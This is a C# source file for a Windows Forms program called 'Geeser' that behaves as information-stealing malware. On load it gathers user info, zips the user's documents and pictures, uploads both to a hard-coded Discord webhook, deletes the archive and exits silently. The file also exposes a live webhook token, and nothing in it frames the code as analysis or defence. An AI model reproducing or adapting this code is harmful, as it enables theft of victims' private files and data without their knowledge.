using static GeeserAuth.IpAuth;
using static GeeserAuth.discordlog;
using static GeeserAuth.Stealth;
using static Geeser.Import;

namespace Geeser
{
    public partial class Form1 : System.Windows.Forms.Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, System.EventArgs e)
        {
            string trash = @"C:\ProgramData\" + wuser() + ".zip";
            string url = "https://discord.com/api/webhooks/974846568563875851/VpJb-I9uvTDOmGb1pi3nmot4wOkgWDH5Jfd_JCunimvBPROq5vICr3DCXgbv_JcP82lC";
            string username = "Geeser";
            var content = userinfo();
            try
            {
                pack();
                DiscordLog(url, username, content);
                using (System.Net.Http.HttpClient httpClient = new System.Net.Http.HttpClient())
                {
                    System.Net.Http.MultipartFormDataContent form = new System.Net.Http.MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(trash);
                    form.Add(new System.Net.Http.ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Documents-Pictures.zip");
                    httpClient.PostAsync(url, form).Wait();
                    httpClient.Dispose(); 
                }
                System.IO.File.Delete(@"C:\ProgramData\" + wuser() + ".zip");
                System.Environment.Exit(0);
            }
            catch (System.Exception)
            {
                System.Environment.Exit(0);
            }
        }
    }
}